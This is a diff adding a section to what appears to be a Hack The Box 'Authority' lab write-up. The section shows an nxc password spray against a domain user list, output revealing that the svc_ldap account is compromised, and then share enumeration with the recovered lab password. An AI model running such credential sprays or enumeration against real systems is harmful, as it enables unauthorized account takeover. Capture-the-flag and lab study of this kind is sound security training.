@@ -358,5 +358,30 @@ Ill spray this password against my user list
 
 # Password spray leads to service account compromise
 ```python
-
+nxc smb authority.authority.htb -u users.txt -p 'lDaP_1n_th3_cle4r!' --continue-on-success
+SMB         10.129.229.56   445    AUTHORITY        [*] Windows 10 / Server 2019 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.229.56   445    AUTHORITY        [-] authority.htb\Administrator:lDaP_1n_th3_cle4r! STATUS_LOGON_FAILURE
+SMB         10.129.229.56   445    AUTHORITY        [-] authority.htb\Guest:lDaP_1n_th3_cle4r! STATUS_LOGON_FAILURE 
+SMB         10.129.229.56   445    AUTHORITY        [-] authority.htb\krbtgt:lDaP_1n_th3_cle4r! STATUS_LOGON_FAILURE
+SMB         10.129.229.56   445    AUTHORITY        [-] authority.htb\AUTHORITY$:lDaP_1n_th3_cle4r! STATUS_LOGON_FAILURE
+SMB         10.129.229.56   445    AUTHORITY        [+] authority.htb\svc_ldap:lDaP_1n_th3_cle4r!
 ```
+I have compromised `svc_ldap`
+
+```python
+nxc smb authority.authority.htb -u svc_ldap -p 'lDaP_1n_th3_cle4r!' --shares
+SMB         10.129.229.56   445    AUTHORITY        [*] Windows 10 / Server 2019 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.229.56   445    AUTHORITY        [+] authority.htb\svc_ldap:lDaP_1n_th3_cle4r! 
+SMB         10.129.229.56   445    AUTHORITY        [*] Enumerated shares
+SMB         10.129.229.56   445    AUTHORITY        Share           Permissions     Remark
+SMB         10.129.229.56   445    AUTHORITY        -----           -----------     ------
+SMB         10.129.229.56   445    AUTHORITY        ADMIN$                          Remote Admin
+SMB         10.129.229.56   445    AUTHORITY        C$                              Default share
+SMB         10.129.229.56   445    AUTHORITY        Department Shares READ            
+SMB         10.129.229.56   445    AUTHORITY        Development     READ            
+SMB         10.129.229.56   445    AUTHORITY        IPC$            READ            Remote IPC
+SMB         10.129.229.56   445    AUTHORITY        NETLOGON        READ            Logon server share 
+SMB         10.129.229.56   445    AUTHORITY        SYSVOL          READ            Logon server share
+```
+This user has more access on the shares
+
